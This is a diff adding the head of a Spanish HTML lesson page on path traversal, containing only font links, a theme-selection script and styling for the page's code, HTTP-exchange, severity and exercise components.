@@ -1,0 +1,1866 @@
+﻿<!DOCTYPE html>
+<html lang="es" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Path Traversal</title>
+<meta name="description" content="Clase de 3 horas sobre Path Traversal (Directory Traversal): técnicas de bypass, explotación, prevención y ejercicios prácticos.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=IBM+Plex+Mono:ital,wght@0,400;0,500;1,400&display=swap" rel="stylesheet">
+<script>
+  (function () {
+    try {
+      var t = localStorage.getItem('theme');
+      if (!t) t = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', t);
+      var m = localStorage.getItem('mode');
+      if (m) document.documentElement.setAttribute('data-mode', m);
+    } catch (e) {}
+  })();
+</script>
+<style>
+
+
+/* ============================================================
+   GuÃ­a de estilo del proyecto (design-architect). Todo tokenizado.
+   ============================================================ */
+*, *::before, *::after { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; }
+img, svg { max-width: 100%; }
+[hidden] { display: none !important; }
+
+:root {
+  color-scheme: light dark;
+
+  --font-display: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  --font-text:    "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  --font-mono:    "IBM Plex Mono", ui-monospace, "SF Mono", "Cascadia Code", Consolas, monospace;
+
+  --fs-h1: clamp(2.25rem, 1.70rem + 2.75vw, 3.50rem);
+  --fs-h2: clamp(1.75rem, 1.42rem + 1.65vw, 2.50rem);
+  --fs-h3: clamp(1.375rem, 1.24rem + 0.65vw, 1.75rem);
+  --fs-h4: clamp(1.125rem, 1.06rem + 0.32vw, 1.3125rem);
+  --fs-body: clamp(1.0625rem, 1.00rem + 0.30vw, 1.25rem);
+  --fs-body-lg: clamp(1.1875rem, 1.08rem + 0.55vw, 1.50rem);
+  --fs-small: clamp(0.875rem, 0.85rem + 0.12vw, 0.9375rem);
+  --fs-code: clamp(0.875rem, 0.83rem + 0.20vw, 1.0625rem);
+  --fs-eyebrow: clamp(0.75rem, 0.73rem + 0.08vw, 0.8125rem);
+  --lh-tight: 1.12; --lh-snug: 1.22; --lh-body: 1.65; --lh-code: 1.6; --lh-ui: 1.4;
+  --tk-h1: -0.021em; --tk-h2: -0.018em; --tk-h3: -0.012em; --tk-h4: -0.006em; --tk-eyebrow: 0.07em;
+
+  --sp-1: 4px; --sp-2: 8px; --sp-3: 12px; --sp-4: 16px; --sp-5: 24px;
+  --sp-6: 32px; --sp-7: 48px; --sp-8: 64px; --sp-9: 96px; --sp-10: 128px;
+  --space-section: clamp(4rem, 2.5rem + 6vw, 7.5rem);
+  --space-block: clamp(2rem, 1.6rem + 1.6vw, 3rem);
+  --space-para: 0.9em; --space-list: 0.4em;
+
+  --measure: 72ch; --col-main-max: 760px; --col-wide-max: 920px;
+  --shell-max: 1200px; --sidebar-w: 264px; --header-h: 56px;
+  --anchor-offset: calc(var(--header-h) + var(--sp-5));
+
+  --radius-xs: 6px; --radius-sm: 8px; --radius-md: 12px; --radius-lg: 16px; --radius-full: 999px;
+  --shadow-sm: 0 1px 2px rgba(17,17,17,0.04), 0 2px 6px rgba(17,17,17,0.06);
+  --shadow-md: 0 8px 24px rgba(17,17,17,0.10), 0 2px 6px rgba(17,17,17,0.06);
+
+  --ease-out: cubic-bezier(0.22,0.61,0.36,1);
+  --ease-in: cubic-bezier(0.55,0.06,0.68,0.19);
+  --ease-in-out: cubic-bezier(0.65,0,0.35,1);
+  --dur-1: 120ms; --dur-2: 180ms; --dur-3: 240ms;
+
+  --icon-stroke: 1.5;
+
+  --c-bg: #FFFFFF; --c-surface: #FAFAF9; --c-surface-raised: #F4F4F2;
+  --c-border: #E7E7E4; --c-border-strong: #D4D4D0;
+  --c-text: #1A1A1A; --c-text-secondary: #595959; --c-text-muted: #767676; --c-text-faint: #9A9A9A;
+
+  --c-accent: #294B8F; --c-accent-hover: #1F3A72; --c-accent-active: #172C57;
+  --c-accent-weak: #EEF2FB; --c-accent-on: #FFFFFF;
+  --c-focus: #294B8F;
+  --focus-ring: 0 0 0 2px var(--c-bg), 0 0 0 4px var(--c-focus);
+
+  --c-insecure: #8E2A2A; --c-insecure-weak: #FBF0EF;
+  --c-secure: #2F6B45; --c-secure-weak: #EFF5F1;
+
+  --c-sev-critical: #8E2A2A; --c-sev-high: #9E4B1E; --c-sev-medium: #8A6A12;
+  --c-sev-low: #2F6B45; --c-sev-info: #4B5563;
+
+  --c-term-bg: #1A1C20; --c-term-surface: #22252A; --c-term-border: #2E323A;
+  --c-term-text: #D6D9DF; --c-term-method: #C3D2F5; --c-term-path: #EDEFF3;
+  --c-term-header: #9AA4B2; --c-term-string: #A8C7A0; --c-term-number: #D9B48A;
+  --c-term-comment: #7A828F;
+  --c-term-attack-bg: rgba(227,155,155,0.16); --c-term-attack-bar: #E39B9B;
+}
+
+:root[data-theme="dark"] {
+  --c-bg: #131211; --c-surface: #1A1917; --c-surface-raised: #232120;
+  --c-border: #2E2C2A; --c-border-strong: #3C3A37;
+  --c-text: #F2F0ED; --c-text-secondary: #A8A5A0; --c-text-muted: #8A8681; --c-text-faint: #6A6763;
+
+  --c-accent: #9DBAF2; --c-accent-hover: #B7CCF6; --c-accent-active: #C9D9F8;
+  --c-accent-weak: rgba(157,186,242,0.14); --c-accent-on: #131211;
+  --c-focus: #9DBAF2;
+
+  --c-insecure: #E39B9B; --c-insecure-weak: rgba(227,155,155,0.12);
+  --c-secure: #86C7A2; --c-secure-weak: rgba(134,199,162,0.12);
+
+  --c-sev-critical: #E39B9B; --c-sev-high: #E0A57C; --c-sev-medium: #D8BE7C;
+  --c-sev-low: #86C7A2; --c-sev-info: #A9B2BF;
+
+  --shadow-sm: 0 1px 2px rgba(0,0,0,0.40), 0 2px 8px rgba(0,0,0,0.30);
+  --shadow-md: 0 10px 30px rgba(0,0,0,0.50), 0 2px 8px rgba(0,0,0,0.35);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --c-bg: #131211; --c-surface: #1A1917; --c-surface-raised: #232120;
+    --c-border: #2E2C2A; --c-border-strong: #3C3A37;
+    --c-text: #F2F0ED; --c-text-secondary: #A8A5A0; --c-text-muted: #8A8681; --c-text-faint: #6A6763;
+    --c-accent: #9DBAF2; --c-accent-hover: #B7CCF6; --c-accent-active: #C9D9F8;
+    --c-accent-weak: rgba(157,186,242,0.14); --c-accent-on: #131211;
+    --c-focus: #9DBAF2;
+    --c-insecure: #E39B9B; --c-insecure-weak: rgba(227,155,155,0.12);
+    --c-secure: #86C7A2; --c-secure-weak: rgba(134,199,162,0.12);
+    --c-sev-critical: #E39B9B; --c-sev-high: #E0A57C; --c-sev-medium: #D8BE7C;
+    --c-sev-low: #86C7A2; --c-sev-info: #A9B2BF;
+    --shadow-sm: 0 1px 2px rgba(0,0,0,0.40), 0 2px 8px rgba(0,0,0,0.30);
+    --shadow-md: 0 10px 30px rgba(0,0,0,0.50), 0 2px 8px rgba(0,0,0,0.35);
+  }
+}
+
+body {
+  background: var(--c-bg);
+  color: var(--c-text);
+  font-family: var(--font-text);
+  font-size: var(--fs-body);
+  line-height: var(--lh-body);
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+
+h1, h2, h3, h4 { font-family: var(--font-display); text-wrap: pretty; margin: 0; }
+h1 { font-size: var(--fs-h1); line-height: var(--lh-tight); letter-spacing: var(--tk-h1); font-weight: 600; }
+h2 { font-size: var(--fs-h2); line-height: var(--lh-tight); letter-spacing: var(--tk-h2); font-weight: 600; }
+h3 { font-size: var(--fs-h3); line-height: var(--lh-snug); letter-spacing: var(--tk-h3); font-weight: 600; }
+h4 { font-size: var(--fs-h4); line-height: var(--lh-snug); letter-spacing: var(--tk-h4); font-weight: 500; }
+p { margin: 0 0 var(--space-para); }
+strong { font-weight: 500; }
+code, kbd, samp { font-family: var(--font-mono); font-size: 0.92em; }
+
+a { color: var(--c-accent); text-decoration: underline; text-underline-offset: 0.15em; text-decoration-thickness: 1px; transition: color var(--dur-1) var(--ease-out); }
+a:hover { color: var(--c-accent-hover); text-decoration-thickness: 2px; }
+a:active { color: var(--c-accent-active); }
+
+:where(a, button, [tabindex], summary, input, select, textarea):focus-visible {
+  outline: 2px solid var(--c-focus);
+  outline-offset: 2px;
+  border-radius: var(--radius-xs);
+}
+
+.skip-link {
+  position: absolute; left: var(--sp-3); top: var(--sp-3);
+  background: var(--c-bg); color: var(--c-text);
+  border: 1px solid var(--c-border-strong); border-radius: var(--radius-sm);
+  padding: var(--sp-2) var(--sp-4); z-index: 100;
+  transform: translateY(-160%);
+  transition: transform var(--dur-2) var(--ease-out);
+}
+.skip-link:focus { transform: translateY(0); }
+
+.eyebrow {
+  font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow);
+  text-transform: uppercase; font-weight: 500; color: var(--c-text-muted);
+  margin: 0 0 var(--sp-3);
+}
+
+/* ---------- Barra de progreso de lectura ---------- */
+.read-progress {
+  position: fixed; top: 0; left: 0; height: 2px; width: 0;
+  background: var(--c-accent); z-index: 90;
+  transition: width var(--dur-1) linear;
+}
+
+/* ---------- Cabecera pegajosa ---------- */
+.header {
+  position: sticky; top: 0; z-index: 80;
+  height: var(--header-h);
+  display: flex; align-items: center; gap: var(--sp-3);
+  padding-inline: clamp(var(--sp-4), 4vw, var(--sp-8));
+  background: transparent;
+  border-bottom: 1px solid transparent;
+  transition: background var(--dur-2) var(--ease-out), border-color var(--dur-2) var(--ease-out), box-shadow var(--dur-2) var(--ease-out);
+}
+.header[data-scrolled="true"] {
+  background: var(--c-bg);
+  border-bottom-color: var(--c-border);
+  box-shadow: var(--shadow-sm);
+}
+.header__title {
+  font-family: var(--font-display); font-weight: 600; font-size: var(--fs-small);
+  color: var(--c-text); text-decoration: none; letter-spacing: -0.01em;
+  margin-right: auto;
+}
+.header__title:hover { color: var(--c-text); }
+.icon-btn {
+  display: inline-flex; align-items: center; justify-content: center;
+  width: 40px; height: 40px; padding: 0;
+  background: transparent; border: 1px solid transparent; border-radius: var(--radius-sm);
+  color: var(--c-text-secondary); cursor: pointer;
+  transition: background var(--dur-1) var(--ease-out), color var(--dur-1) var(--ease-out);
+}
+.icon-btn:hover { background: var(--c-surface-raised); color: var(--c-text); }
+.icon-btn svg { width: 20px; height: 20px; }
+.header__toc-btn { display: inline-flex; }
+@media (min-width: 1024px) { .header__toc-btn { display: none; } }
+
+.ico { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; vertical-align: middle; }
+
+/* ---------- Shell ---------- */
+.shell {
+  max-width: var(--shell-max);
+  margin-inline: auto;
+  padding-inline: clamp(var(--sp-4), 4vw, var(--sp-8));
+  padding-bottom: var(--space-section);
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: var(--sp-7);
+}
+@media (min-width: 1024px) {
+  .shell { grid-template-columns: var(--sidebar-w) minmax(0, 1fr); align-items: start; }
+}
+main { max-width: var(--col-main-max); min-width: 0; }
+.bleed-wide { max-width: var(--col-wide-max); }
+
+/* ---------- NavegaciÃ³n lateral ---------- */
+.sidebar { display: none; }
+@media (min-width: 1024px) {
+  .sidebar {
+    display: block;
+    position: sticky; top: var(--anchor-offset);
+    max-height: calc(100dvh - var(--anchor-offset) - var(--sp-5));
+    overflow-y: auto;
+    padding-right: var(--sp-4);
+    border-right: 1px solid var(--c-border);
+  }
+}
+.toc__title { font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); margin: 0 0 var(--sp-3); font-weight: 500; }
+.toc ol { list-style: none; margin: 0; padding: 0; }
+.toc li { margin: 0; }
+.toc a {
+  display: grid; grid-template-columns: 2ch 1fr; gap: var(--sp-3); align-items: baseline;
+  min-height: 40px; padding: var(--sp-2) var(--sp-3);
+  color: var(--c-text-secondary); text-decoration: none;
+  font-size: var(--fs-small); line-height: var(--lh-ui);
+  border-left: 2px solid transparent; border-radius: 0 var(--radius-xs) var(--radius-xs) 0;
+  transition: background var(--dur-2) var(--ease-in-out), color var(--dur-2) var(--ease-in-out);
+}
+.toc a:hover { background: var(--c-surface-raised); color: var(--c-text); }
+.toc a[aria-current="location"] {
+  color: var(--c-text); font-weight: 500;
+  background: var(--c-accent-weak); border-left-color: var(--c-accent);
+}
+.toc__num { font-family: var(--font-mono); font-variant-numeric: tabular-nums; color: var(--c-text-muted); font-size: var(--fs-eyebrow); }
+
+/* Drawer mÃ³vil */
+.drawer-overlay {
+  position: fixed; inset: 0; background: rgba(17,17,17,0.4); z-index: 95;
+  opacity: 0; pointer-events: none; transition: opacity var(--dur-3) var(--ease-out);
+}
+.drawer-overlay[data-open="true"] { opacity: 1; pointer-events: auto; }
+.drawer {
+  position: fixed; inset-block: 0; left: 0; z-index: 96;
+  width: min(320px, 86vw);
+  background: var(--c-bg); box-shadow: var(--shadow-md);
+  border-radius: 0 var(--radius-lg) var(--radius-lg) 0;
+  padding: var(--sp-5);
+  overflow-y: auto;
+  transform: translateX(-100%);
+  transition: transform var(--dur-3) var(--ease-out);
+}
+.drawer[data-open="true"] { transform: translateX(0); }
+.drawer__head { display: flex; align-items: center; justify-content: space-between; margin-bottom: var(--sp-4); }
+.drawer .toc a { font-size: var(--fs-body); }
+
+/* ---------- Hero ---------- */
+.hero { padding-block: var(--space-section) var(--space-block); border-bottom: 1px solid var(--c-border); }
+.utility-bar { display: flex; gap: var(--sp-2); margin-bottom: var(--sp-6); }
+.hero h1 { max-width: 20ch; }
+.hero__lead { font-size: var(--fs-body-lg); line-height: 1.6; color: var(--c-text-secondary); max-width: 56ch; margin-top: var(--sp-5); text-wrap: balance; }
+.hero__meta { display: flex; flex-wrap: wrap; gap: var(--sp-3) var(--sp-6); margin: var(--sp-6) 0 0; padding: 0; }
+.hero__meta > div { display: flex; flex-direction: column; gap: 2px; }
+.hero__meta dt { font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); }
+.hero__meta dd { margin: 0; font-size: var(--fs-small); color: var(--c-text); font-weight: 500; }
+.hero__cta { margin-top: var(--sp-6); }
+
+/* ---------- Ãndice estÃ¡tico de portada ---------- */
+.toc-static { margin-top: var(--space-block); }
+.toc-static ol { list-style: none; margin: var(--sp-4) 0 0; padding: 0; display: grid; gap: 2px; }
+.toc-static a {
+  display: grid; grid-template-columns: 2.5ch 1fr; gap: var(--sp-4); align-items: baseline;
+  padding: var(--sp-3); text-decoration: none; color: var(--c-text-secondary);
+  border-radius: var(--radius-sm); border: 1px solid transparent;
+  transition: background var(--dur-1) var(--ease-out), color var(--dur-1) var(--ease-out), border-color var(--dur-1) var(--ease-out);
+}
+.toc-static a:hover { background: var(--c-surface); color: var(--c-text); border-color: var(--c-border); }
+.toc-static .toc__num { font-size: var(--fs-small); }
+.toc-static span:last-child { font-size: var(--fs-body); }
+
+/* ---------- Secciones y encabezados ---------- */
+.section { padding-block: var(--space-section); border-top: 1px solid var(--c-border); scroll-margin-top: var(--anchor-offset); }
+.section:first-of-type { border-top: 0; }
+.section > h2 { scroll-margin-top: var(--anchor-offset); }
+.sec-num { font-family: var(--font-mono); font-variant-numeric: tabular-nums; color: var(--c-text-muted); font-size: var(--fs-h3); font-weight: 400; user-select: none; margin-right: 0.4em; }
+.section h3 { margin-top: 1.6em; margin-bottom: 0.6em; }
+.section h4 { margin-top: 1.5em; margin-bottom: 0.5em; color: var(--c-text); }
+.section > h2 + p, .section > h3 + p { margin-top: 0.6em; }
+
+.prose { max-width: var(--measure); }
+.prose ul, .prose ol { max-width: var(--measure); padding-left: 1.3em; margin: 0 0 var(--space-para); }
+.prose li { margin-bottom: var(--space-list); }
+.prose li::marker { color: var(--c-text-muted); }
+.lead-in { font-size: var(--fs-body-lg); line-height: 1.6; color: var(--c-text-secondary); max-width: 62ch; text-wrap: pretty; }
+
+.block { margin-top: var(--space-block); }
+.subhead { font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); font-weight: 500; margin: 0 0 var(--sp-3); }
+
+/* ---------- Callouts ---------- */
+.callout { max-width: var(--measure); margin: var(--space-block) 0; padding-left: var(--sp-4); border-left: 2px solid var(--c-border-strong); }
+.callout > :last-child { margin-bottom: 0; }
+.callout__label { display: flex; align-items: center; gap: var(--sp-2); font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; font-weight: 500; margin: 0 0 var(--sp-2); }
+.callout__label svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; }
+.callout--note { border-left-color: var(--c-border-strong); }
+.callout--note .callout__label { color: var(--c-text-secondary); }
+.callout--warn { border-left-color: var(--c-sev-medium); }
+.callout--warn .callout__label { color: var(--c-sev-medium); }
+.callout--danger { border-left-color: var(--c-sev-critical); background: var(--c-surface); border-radius: 0 var(--radius-md) var(--radius-md) 0; padding: var(--sp-4) var(--sp-4) var(--sp-4) var(--sp-4); border-left-width: 2px; }
+.callout--danger .callout__label { color: var(--c-sev-critical); }
+
+/* ---------- Bloque de cÃ³digo ---------- */
+.code { max-width: var(--col-wide-max); margin: var(--space-block) 0; border: 1px solid var(--c-border); border-radius: var(--radius-md); overflow: hidden; }
+.code__bar { display: flex; align-items: center; justify-content: space-between; gap: var(--sp-3); padding: var(--sp-2) var(--sp-3); background: var(--c-surface); border-bottom: 1px solid var(--c-border); }
+.code__name { font-family: var(--font-mono); font-size: var(--fs-small); color: var(--c-text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.code__copy { display: inline-flex; align-items: center; gap: var(--sp-2); min-height: 32px; padding: var(--sp-1) var(--sp-3); background: transparent; border: 1px solid transparent; border-radius: var(--radius-sm); color: var(--c-text-secondary); font: inherit; font-size: var(--fs-small); cursor: pointer; flex-shrink: 0; transition: background var(--dur-1) var(--ease-out), color var(--dur-1) var(--ease-out); }
+.code__copy:hover { background: var(--c-surface-raised); color: var(--c-text); }
+.code__copy:focus-visible { outline: none; box-shadow: var(--focus-ring); }
+.code__copy svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; }
+.code__copy[data-state="done"] { color: var(--c-accent); }
+.code pre { margin: 0; padding: var(--sp-4); overflow-x: auto; background: var(--c-surface); font-family: var(--font-mono); font-size: var(--fs-code); line-height: var(--lh-code); color: var(--c-text); }
+.code pre code { font-size: inherit; }
+.code--insecure { border-color: color-mix(in srgb, var(--c-insecure) 40%, var(--c-border)); }
+.code--insecure .code__bar { background: var(--c-insecure-weak); color: var(--c-insecure); }
+.code--insecure .code__name { color: var(--c-insecure); }
+.code--secure { border-color: color-mix(in srgb, var(--c-secure) 40%, var(--c-border)); }
+.code--secure .code__bar { background: var(--c-secure-weak); color: var(--c-secure); }
+.code--secure .code__name { color: var(--c-secure); }
+.code__tag { display: inline-flex; align-items: center; gap: var(--sp-2); font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; font-weight: 500; }
+.code__tag svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; }
+
+/* ---------- Intercambio HTTP ---------- */
+.exchange { margin: var(--space-block) 0; max-width: var(--col-wide-max); }
+.exchange__grid { display: grid; gap: var(--sp-4); container-type: inline-size; }
+.exchange__panel { background: var(--c-term-bg); border: 1px solid var(--c-term-border); border-radius: var(--radius-md); overflow: hidden; }
+.exchange__head { display: flex; align-items: center; gap: var(--sp-2); flex-wrap: wrap; margin: 0; padding: var(--sp-3); background: var(--c-term-surface); border-bottom: 1px solid var(--c-term-border); color: var(--c-term-text); font-size: var(--fs-small); font-weight: 500; }
+.exchange__head svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; color: var(--c-term-header); }
+.exchange__meta { font-family: var(--font-mono); color: var(--c-term-header); font-weight: 400; margin-left: auto; }
+.exchange pre { margin: 0; padding: var(--sp-4); overflow-x: auto; background: var(--c-term-bg); color: var(--c-term-text); font-family: var(--font-mono); font-size: var(--fs-code); line-height: var(--lh-code); }
+.exchange figcaption { margin-top: var(--sp-3); font-size: var(--fs-small); color: var(--c-text-secondary); max-width: var(--measure); }
+.tok-method { color: var(--c-term-method); font-weight: 500; }
+.tok-path { color: var(--c-term-path); }
+.tok-header-name { color: var(--c-term-header); }
+.tok-string { color: var(--c-term-string); }
+.tok-number { color: var(--c-term-number); }
+.tok-comment { color: var(--c-term-comment); font-style: italic; }
+.exchange mark.tok-attack { display: inline-block; background: var(--c-term-attack-bg); color: inherit; border-left: 2px solid var(--c-term-attack-bar); padding: 0 var(--sp-2); margin-left: -2px; border-radius: 0 var(--radius-xs) var(--radius-xs) 0; }
+@container (min-width: 860px) { .exchange__grid { grid-template-columns: 1fr 1fr; } }
+
+/* ---------- Tabla OWASP ---------- */
+.table-wrap { max-width: var(--col-wide-max); margin: var(--space-block) 0; overflow-x: auto; }
+table.owasp { width: 100%; border-collapse: collapse; font-size: var(--fs-small); }
+table.owasp caption { text-align: left; font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); margin-bottom: var(--sp-3); }
+table.owasp th { text-align: left; font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); font-weight: 500; padding: var(--sp-3); background: var(--c-surface); border-bottom: 1px solid var(--c-border-strong); }
+table.owasp td { padding: var(--sp-3); border-bottom: 1px solid var(--c-border); vertical-align: top; }
+table.owasp tbody tr:hover, table.owasp tbody tr:hover { background: var(--c-surface-raised); }
+table.owasp td:first-child { font-family: var(--font-mono); font-variant-numeric: tabular-nums; white-space: nowrap; color: var(--c-text-secondary); }
+table.owasp td:nth-child(2) a { font-weight: 500; }
+@media (max-width: 720px) {
+  table.owasp, table.owasp tbody, table.owasp tr, table.owasp td { display: block; width: 100%; }
+  table.owasp thead { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); }
+  table.owasp tr { border: 1px solid var(--c-border); border-radius: var(--radius-md); padding: var(--sp-3); margin-bottom: var(--sp-3); }
+  table.owasp td { border: 0; padding: var(--sp-1) 0; }
+  table.owasp td::before { content: attr(data-label) ": "; font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); display: block; }
+}
+
+/* ---------- Badges ---------- */
+.badge { display: inline-flex; align-items: center; gap: 6px; padding: 2px 8px; border: 1px solid; border-radius: var(--radius-xs); font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; font-weight: 500; font-variant-numeric: tabular-nums; min-height: 24px; line-height: var(--lh-ui); white-space: nowrap; }
+.badge svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; }
+.badge--crit { color: var(--c-sev-critical); border-color: color-mix(in srgb, var(--c-sev-critical) 40%, transparent); background: color-mix(in srgb, var(--c-sev-critical) 8%, transparent); }
+.badge--high { color: var(--c-sev-high); border-color: color-mix(in srgb, var(--c-sev-high) 40%, transparent); background: color-mix(in srgb, var(--c-sev-high) 8%, transparent); }
+.badge--med { color: var(--c-sev-medium); border-color: color-mix(in srgb, var(--c-sev-medium) 40%, transparent); background: color-mix(in srgb, var(--c-sev-medium) 8%, transparent); }
+.badge--low { color: var(--c-sev-low); border-color: color-mix(in srgb, var(--c-sev-low) 40%, transparent); background: color-mix(in srgb, var(--c-sev-low) 8%, transparent); }
+.badge--info { color: var(--c-sev-info); border-color: color-mix(in srgb, var(--c-sev-info) 40%, transparent); background: color-mix(in srgb, var(--c-sev-info) 8%, transparent); }
+
+/* ---------- Tarjeta de vulnerabilidad ---------- */
+.vuln { max-width: var(--col-wide-max); margin: var(--space-block) 0; border: 1px solid var(--c-border); border-radius: var(--radius-md); padding: var(--sp-5); scroll-margin-top: var(--anchor-offset); transition: background 1200ms var(--ease-out); }
+.vuln.is-arrived { background: var(--c-accent-weak); }
+.vuln__head { display: flex; align-items: flex-start; gap: var(--sp-4); flex-wrap: wrap; }
+.vuln__head h3 { flex: 1; min-width: 12ch; }
+.vuln__head .eyebrow { margin: 0; flex-basis: 100%; }
+.vuln__metrics { display: flex; flex-wrap: wrap; gap: var(--sp-5); margin: var(--sp-4) 0 var(--sp-2); }
+.metric { display: flex; flex-direction: column; gap: var(--sp-2); }
+.metric__label { font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); }
+.metric__bar { display: flex; gap: 3px; }
+.metric__seg { width: 22px; height: 4px; border-radius: 2px; background: var(--c-border); }
+.metric__seg.on { background: var(--c-text); }
+.vuln h4 { margin-top: 1.3em; }
+.vuln h4:first-of-type { margin-top: 1em; }
+.vuln ul { padding-left: 1.3em; margin: 0 0 var(--space-para); }
+.vuln li { margin-bottom: var(--space-list); }
+
+/* ---------- Tarjeta de ejercicio ---------- */
+.exercise { max-width: var(--col-wide-max); margin: var(--space-block) 0; border: 1px solid var(--c-border); border-radius: var(--radius-md); padding: var(--sp-5); scroll-margin-top: var(--anchor-offset); }
+.exercise__head { display: flex; align-items: center; gap: var(--sp-3); flex-wrap: wrap; margin-bottom: var(--sp-3); }
+.exercise__head .eyebrow { margin: 0; }
+.tag { display: inline-flex; align-items: center; padding: 2px 8px; background: var(--c-surface-raised); color: var(--c-text-secondary); font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; font-weight: 500; border-radius: var(--radius-sm); }
+.disclosure { border-top: 1px solid var(--c-border); margin-top: var(--sp-3); }
+.disclosure > button { display: flex; align-items: center; gap: var(--sp-2); width: 100%; min-height: 44px; padding: var(--sp-2) 0; background: transparent; border: 0; color: var(--c-text); font: inherit; font-size: var(--fs-small); font-weight: 500; cursor: pointer; text-align: left; }
+.disclosure > button:focus-visible { outline: none; box-shadow: var(--focus-ring); border-radius: var(--radius-xs); }
+.disclosure > button svg.lead { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; color: var(--c-text-secondary); }
+.disclosure > button svg.chev { width: 16px; height: 16px; margin-left: auto; stroke: currentColor; fill: none; stroke-width: var(--icon-stroke); stroke-linecap: round; stroke-linejoin: round; color: var(--c-text-muted); transition: transform var(--dur-2) var(--ease-in-out); }
+.disclosure > button[aria-expanded="true"] svg.chev { transform: rotate(90deg); }
+.disclosure__panel { display: grid; grid-template-rows: 0fr; transition: grid-template-rows var(--dur-3) var(--ease-out); }
+.disclosure__panel > div { overflow: hidden; }
+.disclosure__panel[data-open="true"] { grid-template-rows: 1fr; }
+.disclosure__panel .inner { padding: var(--sp-2) 0 var(--sp-4); }
+.disclosure__panel ol, .disclosure__panel ul { padding-left: 1.3em; margin: 0; }
+.disclosure__panel li { margin-bottom: var(--space-list); }
+
+/* ---------- Diagramas ---------- */
+.diagram { margin: var(--space-block) 0; max-width: var(--col-wide-max); }
+.diagram svg { display: block; width: 100%; height: auto; }
+.diagram figcaption { margin-top: var(--sp-3); font-size: var(--fs-small); color: var(--c-text-secondary); }
+.diagram .node { fill: var(--c-surface); stroke: var(--c-border-strong); stroke-width: 1; }
+.diagram .node-label { fill: var(--c-text); font-family: var(--font-display); font-size: 14px; font-weight: 500; }
+.diagram .conn { stroke: var(--c-text-secondary); stroke-width: 1.5; fill: none; }
+.diagram .conn-accent { stroke: var(--c-accent); stroke-width: 2; fill: none; }
+.diagram .flow-label { fill: var(--c-text-muted); font-family: var(--font-mono); font-size: 11px; }
+.diagram .ico-d { stroke: var(--c-text-secondary); fill: none; stroke-width: 1.5; stroke-linecap: round; stroke-linejoin: round; }
+
+/* ---------- Tablas de contenido simples ---------- */
+.deftable { max-width: var(--col-wide-max); margin: var(--space-block) 0; overflow-x: auto; }
+.deftable table { width: 100%; border-collapse: collapse; font-size: var(--fs-small); }
+.deftable th { text-align: left; font-size: var(--fs-eyebrow); letter-spacing: var(--tk-eyebrow); text-transform: uppercase; color: var(--c-text-muted); font-weight: 500; padding: var(--sp-3); border-bottom: 1px solid var(--c-border-strong); background: var(--c-surface); }
+.deftable td { padding: var(--sp-3); border-bottom: 1px solid var(--c-border); vertical-align: top; }
+.deftable td:first-child { font-weight: 500; white-space: nowrap; }
+.deftable code { color: var(--c-text); }
+
+/* ---------- Pie ---------- */
+.footer { border-top: 1px solid var(--c-border); padding-top: var(--space-block); margin-top: var(--space-section); max-width: var(--col-wide-max); }
+.footer h3 { margin-bottom: var(--sp-4); }
+.footer .block { margin-top: var(--space-block); }
+.footer ul { padding-left: 1.3em; }
+.footer li { margin-bottom: var(--space-list); }
+.glossary { display: grid; gap: var(--sp-3); }
+.glossary div { display: grid; grid-template-columns: 200px 1fr; gap: var(--sp-4); align-items: baseline; }
+.glossary dt { font-weight: 500; color: var(--c-text); }
+.glossary dd { margin: 0; color: var(--c-text-secondary); font-size: var(--fs-small); }
+@media (max-width: 640px) { .glossary div { grid-template-columns: 1fr; gap: 2px; } }
+.reflist { padding-left: 1.4em; }
+.reflist li { margin-bottom: var(--sp-2); font-size: var(--fs-small); }
+
